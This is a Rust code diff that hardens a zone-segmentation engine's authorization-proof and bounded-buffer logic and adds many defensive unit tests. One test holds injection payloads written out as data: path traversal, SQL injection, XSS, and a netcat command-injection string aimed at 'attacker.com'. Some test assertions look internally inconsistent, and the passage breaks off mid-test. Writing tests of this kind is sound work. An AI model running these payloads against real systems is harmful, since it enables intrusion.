@@ -456,7 +456,7 @@ impl ZoneSegmentationEngine {
         }
 
         // Check authorization proof is present (dual-owner bridge).
-        if req.authorization_proof.is_empty() {
+        if req.authorization_proof.trim().is_empty() {
             self.emit_event(
                 ZTS_004_ISOLATION_VIOLATION,
                 &req.source_zone,
@@ -663,8 +663,12 @@ impl Default for ZoneSegmentationEngine {
 }
 
 fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
+    if cap == 0 {
+        items.clear();
+        return;
+    }
     if items.len() >= cap {
-        let overflow = items.len() - cap + 1;
+        let overflow = items.len().saturating_sub(cap).saturating_add(1);
         items.drain(0..overflow);
     }
     items.push(item);
@@ -962,6 +966,21 @@ mod tests {
     }
 
     #[test]
+    fn delete_missing_zone_does_not_remove_existing_zones_or_emit_extra_event() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Strict))
+            .unwrap();
+        let event_count = engine.events().len();
+
+        let result = engine.delete_zone("missing");
+
+        assert_eq!(result, Err(SegmentationError::ZoneNotFound));
+        assert_eq!(engine.list_zones(), vec!["prod".to_string()]);
+        assert_eq!(engine.events().len(), event_count);
+    }
+
+    #[test]
     fn delete_zone_removes_tenant_bindings() {
         let mut engine = ZoneSegmentationEngine::new();
         engine
@@ -982,6 +1001,44 @@ mod tests {
         assert!(engine.is_key_bound_to_zone("key-1", "staging"));
         engine.delete_zone("staging").unwrap();
         assert!(!engine.is_key_bound_to_zone("key-1", "staging"));
+    }
+
+    #[test]
+    fn delete_zone_removes_resource_mappings_for_deleted_zone() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Permissive))
+            .unwrap();
+        engine.register_resource("artifact-1", "staging");
+
+        engine.delete_zone("staging").unwrap();
+
+        assert_eq!(
+            engine.resolve_zone("artifact-1"),
+            Err(SegmentationError::ZoneNotFound)
+        );
+    }
+
+    #[test]
+    fn stale_freshness_delete_keeps_zone_bindings_intact() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Permissive))
+            .unwrap();
+        engine
+            .bind_tenant(make_binding("team-staging", "staging"))
+            .unwrap();
+        engine.bind_key_to_zone("key-staging", "staging");
+        engine.register_resource("artifact-staging", "staging");
+        engine.set_freshness_valid(false);
+
+        assert_eq!(
+            engine.delete_zone("staging"),
+            Err(SegmentationError::FreshnessStale)
+        );
+        assert_eq!(engine.tenant_zone("team-staging").unwrap(), "staging");
+        assert!(engine.is_key_bound_to_zone("key-staging", "staging"));
+        assert_eq!(engine.resolve_zone("artifact-staging").unwrap(), "staging");
     }
 
     // ── Engine: tenant binding ────────────────────────────────────────────
@@ -1029,6 +1086,40 @@ mod tests {
     }
 
     #[test]
+    fn bind_duplicate_tenant_to_different_zone_fails() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Strict))
+            .unwrap();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Permissive))
+            .unwrap();
+        engine
+            .bind_tenant(make_binding("team-alpha", "prod"))
+            .unwrap();
+
+        let result = engine.bind_tenant(make_binding("team-alpha", "staging"));
+
+        assert_eq!(result, Err(SegmentationError::DuplicateTenant));
+        assert_eq!(engine.tenant_zone("team-alpha").unwrap(), "prod");
+    }
+
+    #[test]
+    fn bind_tenant_rejects_whitespace_zone_alias_without_event() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Strict))
+            .unwrap();
+        let event_count = engine.events().len();
+
+        let result = engine.bind_tenant(make_binding("team-alpha", " prod "));
+
+        assert_eq!(result, Err(SegmentationError::ZoneNotFound));
+        assert!(engine.get_tenant_binding("team-alpha").is_none());
+        assert_eq!(engine.events().len(), event_count);
+    }
+
+    #[test]
     fn tenant_zone_returns_zone_id() {
         let mut engine = ZoneSegmentationEngine::new();
         engine
@@ -1045,6 +1136,26 @@ mod tests {
         let engine = ZoneSegmentationEngine::new();
         assert_eq!(
             engine.tenant_zone("unknown"),
+            Err(SegmentationError::TenantNotBound)
+        );
+    }
+
+    #[test]
+    fn tenant_zone_does_not_normalize_tenant_aliases() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Strict))
+            .unwrap();
+        engine
+            .bind_tenant(make_binding("team-alpha", "prod"))
+            .unwrap();
+
+        assert_eq!(
+            engine.tenant_zone(" team-alpha "),
+            Err(SegmentationError::TenantNotBound)
+        );
+        assert_eq!(
+            engine.tenant_zone("TEAM-ALPHA"),
             Err(SegmentationError::TenantNotBound)
         );
     }
@@ -1093,6 +1204,33 @@ mod tests {
         let mut engine = ZoneSegmentationEngine::new();
         engine.bind_key_to_zone("key-1", "prod");
         assert!(engine.validate_key_zone("key-1", "prod").is_ok());
+    }
+
+    #[test]
+    fn validate_key_zone_rejects_key_bound_only_to_other_zone() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine.bind_key_to_zone("key-1", "staging");
+
+        assert_eq!(
+            engine.validate_key_zone("key-1", "prod"),
+            Err(SegmentationError::KeyZoneMismatch)
+        );
+        assert!(engine.is_key_bound_to_zone("key-1", "staging"));
+    }
+
+    #[test]
+    fn validate_key_zone_does_not_normalize_key_or_zone_aliases() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine.bind_key_to_zone("key-1", "prod");
+
+        assert_eq!(
+            engine.validate_key_zone(" key-1 ", "prod"),
+            Err(SegmentationError::KeyZoneMismatch)
+        );
+        assert_eq!(
+            engine.validate_key_zone("key-1", " prod "),
+            Err(SegmentationError::KeyZoneMismatch)
+        );
     }
 
     #[test]
@@ -1196,6 +1334,79 @@ mod tests {
         );
     }
 
+    #[test]
+    fn cross_zone_permissive_still_rejects_missing_proof() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Permissive))
+            .unwrap();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Permissive))
+            .unwrap();
+        let req = make_cross_zone_req("prod", "staging", "");
+
+        assert_eq!(
+            engine.authorize_cross_zone(&req),
+            Err(SegmentationError::BridgeAuthIncomplete)
+        );
+        assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+    }
+
+    #[test]
+    fn cross_zone_permissive_rejects_whitespace_only_proof() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Permissive))
+            .unwrap();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Permissive))
+            .unwrap();
+        let req = make_cross_zone_req("prod", "staging", "   ");
+
+        assert_eq!(
+            engine.authorize_cross_zone(&req),
+            Err(SegmentationError::BridgeAuthIncomplete)
+        );
+        assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+        assert_eq!(engine.event_count(ZTS_003_CROSS_ZONE_AUTHORIZED), 0);
+    }
+
+    #[test]
+    fn cross_zone_custom_rejects_unlisted_target() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Custom))
+            .unwrap();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Strict))
+            .unwrap();
+        let req = make_cross_zone_req("prod", "staging", "proof");
+
+        assert_eq!(
+            engine.authorize_cross_zone(&req),
+            Err(SegmentationError::IsolationViolation)
+        );
+        assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+    }
+
+    #[test]
+    fn cross_zone_strict_rejects_whitespace_target_alias_even_with_canonical_allow() {
+        let mut engine = ZoneSegmentationEngine::new();
+        let mut prod = make_zone("prod", 90, 5, IsolationLevel::Strict);
+        prod.allow_cross_zone("staging");
+        engine.register_zone(prod).unwrap();
+        engine
+            .register_zone(make_zone(" staging ", 70, 3, IsolationLevel::Strict))
+            .unwrap();
+        let req = make_cross_zone_req("prod", " staging ", "proof");
+
+        assert_eq!(
+            engine.authorize_cross_zone(&req),
+            Err(SegmentationError::IsolationViolation)
+        );
+        assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+    }
+
     // ── Engine: isolation level ───────────────────────────────────────────
 
     #[test]
@@ -1242,6 +1453,16 @@ mod tests {
         );
     }
 
+    #[test]
+    fn delegation_depth_unknown_zone_fails_closed() {
+        let engine = ZoneSegmentationEngine::new();
+
+        assert_eq!(
+            engine.check_delegation_depth("missing", 1),
+            Err(SegmentationError::ZoneNotFound)
+        );
+    }
+
     // ── Engine: trust ceiling ─────────────────────────────────────────────
 
     #[test]
@@ -1262,6 +1483,16 @@ mod tests {
         assert_eq!(
             engine.check_trust_ceiling("prod", 91),
             Err(SegmentationError::IsolationViolation)
+        );
+    }
+
+    #[test]
+    fn trust_ceiling_unknown_zone_fails_closed() {
+        let engine = ZoneSegmentationEngine::new();
+
+        assert_eq!(
+            engine.check_trust_ceiling("missing", 1),
+            Err(SegmentationError::ZoneNotFound)
         );
     }
 
@@ -1302,6 +1533,45 @@ mod tests {
                 .validate_zone_action("prod", "staging", "deploy", "user-1", "bridge-token")
                 .is_ok()
         );
+    }
+
+    #[test]
+    fn validate_zone_action_unknown_target_fails_closed() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Strict))
+            .unwrap();
+
+        assert_eq!(
+            engine.validate_zone_action("prod", "missing", "deploy", "user-1", "proof"),
+            Err(SegmentationError::ZoneNotFound)
+        );
+    }
+
+    #[test]
+    fn validate_zone_action_rejects_whitespace_only_proof() {
+        let mut engine = ZoneSegmentationEngine::new();
+        engine
+            .register_zone(make_zone("prod", 90, 5, IsolationLevel::Permissive))
+            .unwrap();
+        engine
+            .register_zone(make_zone("staging", 70, 3, IsolationLevel::Strict))
+            .unwrap();
+
+        assert_eq!(
+            engine.validate_zone_action("prod", "staging", "deploy", "user-1", "\t"),
+            Err(SegmentationError::BridgeAuthIncomplete)
+        );
+        assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+    }
+
+    #[test]
+    fn push_bounded_zero_capacity_drops_item_without_panic() {
+        let mut values = vec![1, 2, 3];
+
+        push_bounded(&mut values, 4, 0);
+
+        assert!(values.is_empty());
     }
 
     // ── Engine: events ────────────────────────────────────────────────────
@@ -1413,5 +1683,809 @@ mod tests {
         assert_eq!(engine.event_count(ZTS_002_TENANT_BOUND), 3);
         assert_eq!(engine.event_count(ZTS_003_CROSS_ZONE_AUTHORIZED), 1);
         assert_eq!(engine.event_count(ZTS_004_ISOLATION_VIOLATION), 1);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // NEGATIVE-PATH EDGE CASE AND ATTACK VECTOR TESTS
+    // ═══════════════════════════════════════════════════════════════════════
+
+    #[test]
+    fn negative_zone_policy_with_extremely_large_trust_ceiling_saturates_at_100() {
+        // Test trust ceiling overflow protection
+        let policy = ZonePolicy::new("overflow-zone", u32::MAX, 5, IsolationLevel::Strict);
+
+        // Should be capped at 100 regardless of input value
+        assert_eq!(policy.trust_ceiling, 100);
+
+        // Even at maximum, should still properly validate against ceiling
+        assert!(!policy.exceeds_ceiling(100));
+        assert!(policy.exceeds_ceiling(101)); // This should never happen, but test boundary
+
+        // Edge case: u32::MAX - 1 should also cap at 100
+        let policy2 = ZonePolicy::new("overflow-zone-2", u32::MAX.saturating_sub(1), 5, IsolationLevel::Strict);
+        assert_eq!(policy2.trust_ceiling, 100);
+    }
+
+    #[test]
+    fn negative_zone_policy_with_u32_max_delegation_depth_handles_safely() {
+        // Test delegation depth boundary conditions with maximum values
+        let policy = ZonePolicy::new("depth-zone", 80, u32::MAX, IsolationLevel::Strict);
+
+        // Should accept the maximum value without overflow
+        assert_eq!(policy.delegation_depth_limit, u32::MAX);
+
+        // Boundary checking should work correctly
+        assert!(!policy.exceeds_depth(u32::MAX));
+        assert!(!policy.exceeds_depth(u32::MAX.saturating_sub(1)));
+
+        // Only values that would overflow when incremented should be rejected
+        // Note: in practice, exceeds_depth(x) checks x > limit, so no value can exceed u32::MAX
+        assert!(!policy.exceeds_depth(0));
+    }
+
+    #[test]
+    fn negative_zone_allow_cross_zone_with_injection_attempts_stores_literally() {
+        let mut policy = ZonePolicy::new("victim-zone", 80, 5, IsolationLevel::Strict);
+
+        // Attempt various injection attacks in zone IDs
+        let malicious_zones = vec![
+            "../../etc/passwd",               // Path traversal
+            "zone'; DROP TABLE zones; --",    // SQL injection attempt
+            "zone\x00null-byte",             // Null byte injection
+            "zone\n\r\tcontrol-chars",       // Control character injection
+            "|nc attacker.com 4444",         // Command injection attempt
+            "<script>alert('xss')</script>",  // XSS attempt
+            "\u{202E}ecaf-kcatta\u{202D}",   // Unicode BiDi override attack
+        ];
+
+        for malicious_zone in malicious_zones {
+            policy.allow_cross_zone(malicious_zone);
+        }
+
+        // Should store all malicious strings literally without sanitization
+        assert_eq!(policy.allowed_cross_zone_targets.len(), 7);
+        assert!(policy.allowed_cross_zone_targets.contains(&"../../etc/passwd".to_string()));
+        assert!(policy.allowed_cross_zone_targets.contains(&"zone'; DROP TABLE zones; --".to_string()));
+
+        // No deduplication should occur for different malicious strings
+        policy.allow_cross_zone("../../etc/passwd"); // Duplicate
+        assert_eq!(policy.allowed_cross_zone_targets.len(), 7); // No change due to dedup
+    }
+
+    #[test]
+    fn negative_tenant_binding_with_unicode_normalization_edge_cases() {
+        // Test Unicode normalization attack vectors in tenant and zone IDs
+        let binding1 = TenantBinding::new(
+            "café",     // NFC normalization (single char é)
+            "zone-1",
+            "read,write",
+            5
+        );
+
+        let binding2 = TenantBinding::new(
+            "cafe\u{0301}",  // NFD normalization (e + combining acute accent)
+            "zone-1",
+            "read,write",
+            5
+        );
+
+        // These should be treated as different tenant IDs (no normalization)
+        assert_ne!(binding1.tenant_id, binding2.tenant_id);
+        assert_eq!(binding1.tenant_id, "café");
+        assert_eq!(binding2.tenant_id, "cafe\u{0301}");
+
+        // Test with invisible/zero-width characters
+        let binding3 = TenantBinding::new(
+            "tenant\u{200B}invisible",  // Zero-width space
+            "zone\u{FEFF}bom",          // BOM character in zone
+            "\u{034F}hidden\u{200D}scope", // Combining grapheme joiner in scope
+            u32::MAX, // Maximum extension count
+        );
+
+        assert!(binding3.tenant_id.contains('\u{200B}'));
+        assert!(binding3.zone_id.contains('\u{FEFF}'));
+        assert!(binding3.trust_scope.contains('\u{034F}'));
+        assert_eq!(binding3.max_extension_count, u32::MAX);
+    }
+
+    #[test]
+    fn negative_cross_zone_request_with_massive_field_lengths() {
+        // Test memory exhaustion protection with extremely large field values
+        let huge_zone = "z".repeat(1_000_000);  // 1MB zone name
+        let huge_action = "a".repeat(500_000);   // 500KB action
+        let huge_requester = "r".repeat(250_000); // 250KB requester
+        let huge_proof = "p".repeat(2_000_000);   // 2MB authorization proof
+
+        let request = CrossZoneRequest::new(
+            huge_zone.clone(),
+            "target-zone",
+            huge_action.clone(),
+            huge_requester.clone(),
+            huge_proof.clone(),
+        );
+
+        // Should handle large fields without panic or excessive memory allocation
+        assert_eq!(request.source_zone.len(), 1_000_000);
+        assert_eq!(request.action.len(), 500_000);
+        assert_eq!(request.requester.len(), 250_000);
+        assert_eq!(request.authorization_proof.len(), 2_000_000);
+
+        // Test serialization with massive fields
+        let start = std::time::Instant::now();
+        let json_result = serde_json::to_string(&request);
+        let duration = start.elapsed();
+
+        // Should complete serialization within reasonable time (10 seconds is generous)
+        assert!(json_result.is_ok());
+        assert!(duration < std::time::Duration::from_secs(10));
+    }
+
+    #[test]
+    fn negative_segmentation_error_display_injection_resistance() {
+        // Test that error display doesn't inadvertently execute or interpret malicious content
+        let errors_with_context = vec![
+            SegmentationError::CrossZoneViolation,
+            SegmentationError::TenantNotBound,
+            SegmentationError::ZoneNotFound,
+            SegmentationError::DelegationDepthExceeded,
+            SegmentationError::IsolationViolation,
+        ];
+
+        for error in errors_with_context {
+            let display_str = format!("{}", error);
+
+            // Error strings should not contain potentially dangerous characters
+            assert!(!display_str.contains('<'), "Error display should not contain HTML/XML: {}", display_str);
+            assert!(!display_str.contains('&'), "Error display should not contain HTML entities: {}", display_str);
+            assert!(!display_str.contains('\x00'), "Error display should not contain null bytes: {}", display_str);
+            assert!(!display_str.contains('\n'), "Error display should not contain newlines: {}", display_str);
+
+            // Should be consistent uppercase format
+            assert!(display_str.chars().all(|c| c.is_ascii_uppercase() || c == '_'),
+                   "Error display should be UPPER_CASE format: {}", display_str);
+        }
+    }
+
+    #[test]
+    fn negative_engine_key_zone_binding_with_maximum_capacity_overflow() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Try to add more bindings than MAX_KEY_ZONE_BINDINGS_PER_KEY
+        let test_key = "overflow-key";
+
+        // Add exactly the maximum allowed bindings
+        for i in 0..MAX_KEY_ZONE_BINDINGS_PER_KEY {
+            engine.bind_key_to_zone(test_key, format!("zone-{:05}", i));
+        }
+
+        // Verify we have exactly the maximum
+        let binding_count = engine.key_zone_bindings.get(test_key).unwrap().len();
+        assert_eq!(binding_count, MAX_KEY_ZONE_BINDINGS_PER_KEY);
+
+        // Try to add one more - should be handled by push_bounded
+        engine.bind_key_to_zone(test_key, "overflow-zone");
+
+        // Should not exceed maximum due to push_bounded capacity enforcement
+        let final_count = engine.key_zone_bindings.get(test_key).unwrap().len();
+        assert!(final_count <= MAX_KEY_ZONE_BINDINGS_PER_KEY);
+
+        // Most recent binding should be present
+        assert!(engine.is_key_bound_to_zone(test_key, "overflow-zone"));
+
+        // Earliest binding should be evicted
+        assert!(!engine.is_key_bound_to_zone(test_key, "zone-00000"));
+    }
+
+    #[test]
+    fn negative_engine_audit_event_overflow_protection_with_max_events() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Fill up the audit event buffer to capacity
+        for i in 0..MAX_EVENTS {
+            let zone_id = format!("zone-{:05}", i);
+            let policy = ZonePolicy::new(&zone_id, 80, 5, IsolationLevel::Strict);
+            let _ = engine.register_zone(policy); // Generates ZTS_001 event
+        }
+
+        assert_eq!(engine.events().len(), MAX_EVENTS);
+
+        // Add one more event that should trigger capacity management
+        let overflow_policy = ZonePolicy::new("overflow-zone", 80, 5, IsolationLevel::Strict);
+        let _ = engine.register_zone(overflow_policy);
+
+        // Should not exceed MAX_EVENTS due to push_bounded protection
+        assert!(engine.events().len() <= MAX_EVENTS);
+
+        // Most recent event should be present
+        assert!(engine.events().iter().any(|e| e.zone_id == "overflow-zone"));
+
+        // Earliest event should be evicted (FIFO behavior)
+        assert!(!engine.events().iter().any(|e| e.zone_id == "zone-00000"));
+    }
+
+    #[test]
+    fn negative_authorization_proof_with_whitespace_bypass_attempts() {
+        let mut engine = ZoneSegmentationEngine::new();
+        let mut prod = make_zone("prod", 90, 5, IsolationLevel::Strict);
+        prod.allow_cross_zone("staging");
+        engine.register_zone(prod).unwrap();
+        engine.register_zone(make_zone("staging", 70, 3, IsolationLevel::Strict)).unwrap();
+
+        // Test various whitespace-only authorization proofs that try to bypass validation
+        let whitespace_proofs = vec![
+            "   ",                    // Spaces
+            "\t\t\t",                 // Tabs
+            "\n\n\n",                 // Newlines
+            "\r\r\r",                 // Carriage returns
+            " \t\n\r ",               // Mixed whitespace
+            "\u{00A0}",               // Non-breaking space
+            "\u{2000}",               // En quad
+            "\u{2001}",               // Em quad
+            "\u{2002}",               // En space
+            "\u{2003}",               // Em space
+            "\u{2004}",               // Three-per-em space
+            "\u{2005}",               // Four-per-em space
+            "\u{2006}",               // Six-per-em space
+            "\u{2007}",               // Figure space
+            "\u{2008}",               // Punctuation space
+            "\u{2009}",               // Thin space
+            "\u{200A}",               // Hair space
+            "\u{200B}",               // Zero-width space
+            "\u{2060}",               // Word joiner
+            "\u{FEFF}",               // Zero-width non-breaking space (BOM)
+        ];
+
+        for proof in whitespace_proofs {
+            let req = CrossZoneRequest::new("prod", "staging", "test-action", "test-user", proof);
+
+            let result = engine.authorize_cross_zone(&req);
+            assert_eq!(result, Err(SegmentationError::BridgeAuthIncomplete),
+                      "Whitespace-only proof '{}' (U+{:04X} chars) should be rejected",
+                      proof, proof.chars().next().unwrap_or('\0') as u32);
+        }
+
+        // Should have generated isolation violation events for each failed attempt
+        assert!(engine.event_count(ZTS_004_ISOLATION_VIOLATION) >= whitespace_proofs.len());
+        assert_eq!(engine.event_count(ZTS_003_CROSS_ZONE_AUTHORIZED), 0);
+    }
+
+    #[test]
+    fn negative_trust_ceiling_boundary_with_arithmetic_edge_cases() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Test with trust ceiling at exact boundaries
+        let boundary_values = vec![
+            (0, 0),     // Minimum values
+            (0, 1),     // Zero ceiling, minimal trust
+            (1, 0),     // Minimal ceiling, zero trust
+            (1, 1),     // Both minimal non-zero
+            (100, 100), // Both at maximum
+            (100, 99),  // Ceiling at max, trust just below
+            (99, 100),  // Ceiling just below max, trust at potential overflow
+            (100, u32::MAX), // Ceiling at max, trust at maximum possible
+        ];
+
+        for (ceiling, trust_score) in boundary_values {
+            let zone_id = format!("zone-ceiling-{}-trust-{}", ceiling, trust_score.min(1000));
+            engine.register_zone(ZonePolicy::new(&zone_id, ceiling, 5, IsolationLevel::Strict)).unwrap();
+
+            let result = engine.check_trust_ceiling(&zone_id, trust_score);
+
+            if trust_score > ceiling {
+                assert_eq!(result, Err(SegmentationError::IsolationViolation),
+                          "Trust score {} should exceed ceiling {}", trust_score, ceiling);
+            } else {
+                assert!(result.is_ok(),
+                       "Trust score {} should not exceed ceiling {}", trust_score, ceiling);
+            }
+        }
+    }
+
+    #[test]
+    fn negative_delegation_depth_with_overflow_and_boundary_conditions() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Test delegation depth checking with edge case values
+        let depth_test_cases = vec![
+            (0, 0, true),          // Zero limit, zero depth - should pass
+            (0, 1, false),         // Zero limit, non-zero depth - should fail
+            (1, 0, true),          // Minimal limit, zero depth - should pass
+            (1, 1, true),          // Minimal limit, equal depth - should pass (not exceeded)
+            (1, 2, false),         // Minimal limit, exceeded depth - should fail
+            (u32::MAX, 0, true),   // Maximum limit, zero depth - should pass
+            (u32::MAX, u32::MAX, true),    // Maximum limit, equal depth - should pass
+            (u32::MAX.saturating_sub(1), u32::MAX, false), // Near-max limit, max depth - should fail
+            (100, u32::MAX, false), // Normal limit, maximum depth - should fail
+        ];
+
+        for (i, (limit, depth, should_pass)) in depth_test_cases.into_iter().enumerate() {
+            let zone_id = format!("depth-zone-{}", i);
+            engine.register_zone(ZonePolicy::new(&zone_id, 80, limit, IsolationLevel::Strict)).unwrap();
+
+            let result = engine.check_delegation_depth(&zone_id, depth);
+
+            if should_pass {
+                assert!(result.is_ok(),
+                       "Depth {} should not exceed limit {} for zone {}", depth, limit, zone_id);
+            } else {
+                assert_eq!(result, Err(SegmentationError::DelegationDepthExceeded),
+                          "Depth {} should exceed limit {} for zone {}", depth, limit, zone_id);
+            }
+        }
+    }
+
+    #[test]
+    fn negative_resource_zone_resolution_with_case_sensitivity_and_normalization() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Test case sensitivity in resource-to-zone mappings
+        engine.register_resource("Resource-1", "Zone-A");
+        engine.register_resource("resource-1", "zone-a");
+        engine.register_resource("RESOURCE-1", "ZONE-A");
+
+        // Should treat all as different resources (case-sensitive)
+        assert_eq!(engine.resolve_zone("Resource-1").unwrap(), "Zone-A");
+        assert_eq!(engine.resolve_zone("resource-1").unwrap(), "zone-a");
+        assert_eq!(engine.resolve_zone("RESOURCE-1").unwrap(), "ZONE-A");
+
+        // Variations should not resolve
+        assert_eq!(engine.resolve_zone("resource-1").unwrap(), "zone-a");
+        assert!(engine.resolve_zone("Resource-1-Different").is_err());
+
+        // Test Unicode normalization edge cases
+        engine.register_resource("café", "unicode-zone-1");     // NFC
+        engine.register_resource("cafe\u{0301}", "unicode-zone-2"); // NFD
+
+        // Should treat NFC and NFD as different resources (no normalization)
+        assert_eq!(engine.resolve_zone("café").unwrap(), "unicode-zone-1");
+        assert_eq!(engine.resolve_zone("cafe\u{0301}").unwrap(), "unicode-zone-2");
+
+        // Test with invisible/zero-width characters
+        engine.register_resource("invisible\u{200B}resource", "hidden-zone");
+        assert_eq!(engine.resolve_zone("invisible\u{200B}resource").unwrap(), "hidden-zone");
+        assert!(engine.resolve_zone("invisibleresource").is_err()); // Without zero-width space
+    }
+
+    #[test]
+    fn negative_zone_deletion_cascade_with_complex_interdependencies() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Create complex interdependent zone structure
+        engine.register_zone(make_zone("zone-1", 80, 5, IsolationLevel::Strict)).unwrap();
+        engine.register_zone(make_zone("zone-2", 70, 3, IsolationLevel::Strict)).unwrap();
+        engine.register_zone(make_zone("zone-3", 60, 2, IsolationLevel::Strict)).unwrap();
+
+        // Create tenant bindings across zones
+        engine.bind_tenant(make_binding("tenant-1", "zone-1")).unwrap();
+        engine.bind_tenant(make_binding("tenant-2", "zone-2")).unwrap();
+        engine.bind_tenant(make_binding("tenant-3", "zone-3")).unwrap();
+
+        // Create key-zone bindings across zones
+        engine.bind_key_to_zone("key-1", "zone-1");
+        engine.bind_key_to_zone("key-1", "zone-2");
+        engine.bind_key_to_zone("key-2", "zone-2");
+        engine.bind_key_to_zone("key-2", "zone-3");
+        engine.bind_key_to_zone("key-3", "zone-1");
+        engine.bind_key_to_zone("key-3", "zone-3");
+
+        // Create resource mappings
+        engine.register_resource("resource-1", "zone-1");
+        engine.register_resource("resource-2", "zone-2");
+        engine.register_resource("resource-3", "zone-3");
+
+        // Verify initial state
+        assert_eq!(engine.list_zones().len(), 3);
+        assert!(engine.get_tenant_binding("tenant-2").is_some());
+        assert!(engine.is_key_bound_to_zone("key-1", "zone-2"));
+        assert_eq!(engine.resolve_zone("resource-2").unwrap(), "zone-2");
+
+        // Delete zone-2 (should cascade properly)
+        let result = engine.delete_zone("zone-2");
+        assert!(result.is_ok());
+
+        // Verify cascade effects
+        assert_eq!(engine.list_zones(), vec!["zone-1", "zone-3"]); // zone-2 removed
+        assert!(engine.get_tenant_binding("tenant-2").is_none()); // tenant-2 binding removed
+        assert!(engine.get_tenant_binding("tenant-1").is_some()); // Other tenants preserved
+        assert!(engine.get_tenant_binding("tenant-3").is_some());
+
+        // Key bindings should be updated
+        assert!(!engine.is_key_bound_to_zone("key-1", "zone-2")); // zone-2 binding removed
+        assert!(engine.is_key_bound_to_zone("key-1", "zone-1"));  // Other bindings preserved
+        assert!(!engine.is_key_bound_to_zone("key-2", "zone-2")); // zone-2 binding removed
+        assert!(engine.is_key_bound_to_zone("key-2", "zone-3"));  // zone-3 binding preserved
+
+        // Resource mapping should be removed
+        assert!(engine.resolve_zone("resource-2").is_err()); // resource-2 mapping removed
+        assert_eq!(engine.resolve_zone("resource-1").unwrap(), "zone-1"); // Others preserved
+        assert_eq!(engine.resolve_zone("resource-3").unwrap(), "zone-3");
+    }
+
+    #[test]
+    fn negative_serialization_with_maximum_field_values_and_extreme_unicode() {
+        // Test serialization/deserialization with extreme values and Unicode edge cases
+        let extreme_zone_policy = ZonePolicy {
+            zone_id: "\u{10FFFF}".repeat(10000), // Max Unicode codepoint repeated
+            trust_ceiling: 100,
+            delegation_depth_limit: u32::MAX,
+            allowed_cross_zone_targets: (0..1000).map(|i| format!("target-{}", i)).collect(),
+            isolation_level: IsolationLevel::Custom,
+        };
+
+        // Test JSON serialization with massive data
+        let start = std::time::Instant::now();
+        let json_result = serde_json::to_string(&extreme_zone_policy);
+        let serialize_duration = start.elapsed();
+
+        assert!(json_result.is_ok());
+        assert!(serialize_duration < std::time::Duration::from_secs(5)); // Should complete reasonably fast
+
+        // Test deserialization round-trip
+        let json_str = json_result.unwrap();
+        let start = std::time::Instant::now();
+        let deserialize_result: Result<ZonePolicy, _> = serde_json::from_str(&json_str);
+        let deserialize_duration = start.elapsed();
+
+        assert!(deserialize_result.is_ok());
+        assert!(deserialize_duration < std::time::Duration::from_secs(5));
+
+        let roundtrip_policy = deserialize_result.unwrap();
+        assert_eq!(extreme_zone_policy, roundtrip_policy);
+    }
+
+    #[test]
+    fn negative_engine_with_massive_state_memory_pressure_scenarios() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Create massive state to test memory handling
+        let zone_count = 1000;
+        let tenant_count = 2000;
+        let resource_count = 3000;
+
+        // Register many zones
+        for i in 0..zone_count {
+            let zone_id = format!("stress-zone-{:06}", i);
+            let mut policy = ZonePolicy::new(&zone_id, 80, 5, IsolationLevel::Strict);
+
+            // Each zone allows cross-zone access to next 5 zones (creates complex web)
+            for j in 1..=5 {
+                let target_idx = (i + j) % zone_count;
+                policy.allow_cross_zone(format!("stress-zone-{:06}", target_idx));
+            }
+
+            engine.register_zone(policy).unwrap();
+        }
+
+        // Bind many tenants
+        for i in 0..tenant_count {
+            let tenant_id = format!("stress-tenant-{:06}", i);
+            let zone_idx = i % zone_count;
+            let zone_id = format!("stress-zone-{:06}", zone_idx);
+
+            let binding = TenantBinding::new(
+                tenant_id,
+                zone_id,
+                format!("scope-{}", i),
+                u32::MAX.saturating_sub(i as u32)
+            );
+
+            engine.bind_tenant(binding).unwrap();
+        }
+
+        // Register many resources
+        for i in 0..resource_count {
+            let resource_id = format!("stress-resource-{:06}", i);
+            let zone_idx = i % zone_count;
+            let zone_id = format!("stress-zone-{:06}", zone_idx);
+
+            engine.register_resource(resource_id, zone_id);
+        }
+
+        // Verify state integrity under memory pressure
+        assert_eq!(engine.list_zones().len(), zone_count);
+        assert_eq!(engine.tenant_bindings.len(), tenant_count);
